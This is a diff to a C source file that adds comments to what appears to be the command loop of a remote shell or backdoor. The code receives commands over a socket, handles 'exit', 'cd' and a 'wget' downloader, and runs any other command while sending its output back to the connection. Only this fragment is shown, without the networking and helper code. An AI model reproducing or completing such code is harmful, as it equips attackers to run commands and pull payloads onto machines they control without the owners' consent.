@@ -1,13 +1,13 @@
 #include "../header/bin.h"
 
-int process_command(struct main_struct *m_s)
+int process_command(struct main_struct *m_s)	// check if a command is a built in one
 {
-	if(my_strcmp(m_s->cmd, "exit\n")) {
-		m_s->cn = SOCKET_ERROR;
-	} else if((m_s->cmd[0] == 'c') && (m_s->cmd[1] == 'd') && (m_s->cmd[2] == ' ')){
+	if(my_strcmp(m_s->cmd, "exit\n")) {		// use custom my_strcmp to check
+		m_s->cn = SOCKET_ERROR;			// close connection
+	} else if((m_s->cmd[0] == 'c') && (m_s->cmd[1] == 'd') && (m_s->cmd[2] == ' ')){ // chdir command integration
 		cd(m_s->cmd);
-		sender(m_s->s, " ", 2, &m_s->cn);
-	} else if(m_s->cmd[0] == 'w' && m_s->cmd[1] == 'g' && m_s->cmd[2] == 'e' && m_s->cmd[3] == 't' && m_s->cmd[4] == ' ') {
+		sender(m_s->s, " ", 2, &m_s->cn);					// send data back.
+	} else if(m_s->cmd[0] == 'w' && m_s->cmd[1] == 'g' && m_s->cmd[2] == 'e' && m_s->cmd[3] == 't' && m_s->cmd[4] == ' ') {	// downloader command
 		wget(m_s->cmd);
 		sender(m_s->s, "File Downloaded", 16, &m_s->cn);
 	}
@@ -41,7 +41,7 @@ int exe(struct main_struct *m_s)// execute commands that are unknown to the
 			while(((ch = fgetc(cmd_f)) != EOF) && i <= (size-1)) {
 				m_s->buf[i] = ch;	// read from file and save to buf
 				i++;												// increment i;
-			}		
+			}
 			if((ch != EOF) && i <= size){	// if reading the output is not at eof
 				my_strcpy(temp, m_s->buf, strlen(m_s->buf));	// save it to the temp
 				size *= 2;		// add more size
